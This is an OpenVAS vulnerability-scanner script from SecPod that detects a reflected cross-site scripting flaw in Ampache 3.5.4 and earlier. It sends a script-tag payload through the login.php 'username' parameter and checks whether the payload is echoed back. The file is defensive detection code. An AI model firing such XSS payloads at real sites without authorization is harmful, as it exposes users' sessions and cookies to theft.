###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ampache_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Ampache Reflected Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to execute arbitrary script
  code in the browser of an unsuspecting user in the context of the affected
  site.
  Impact Level: Application";
tag_affected = "Ampache version 3.5.4 and prior";
tag_insight = "The flaw is due to an input passed via the 'username' parameter to the
  'login.php' script is not properly sanitized before being returned to the
  user.";
tag_solution = "No solution or patch is available as of 23rd June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://ampache.org/";
tag_summary = "This host is running Ampache and is prone to reflected cross-site
  scripting vulnerability.";

if(description)
{
  script_id(902450);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Ampache Reflected Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101232/Ampache3.5.4-XSS.txt");

  script_description(desc);
  script_summary("Check for Ampache Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir (make_list("/Ampache", "/demo", cgi_dirs()))
{
  sndReq = http_get(item:string(dir , "/login.php"), port:port);
  rcvRes = http_send_recv(port:port, data:sndReq);

  ## Confirm application
  if("<title> Ampache" >< rcvRes)
  {
    ## Try XSS attack
    sndReq = http_get(item:string(dir, '/login.php?username="><script>alert' +
         '(document.cookie)</script>"'), port:port);
    rcvRes = http_send_recv(port:port, data:sndReq);

    ## Confirm the attack
    if(("><script>alert(document.cookie)</script>" >< rcvRes))
    {
      security_warning(port);
      exit(0);
    }
  }
}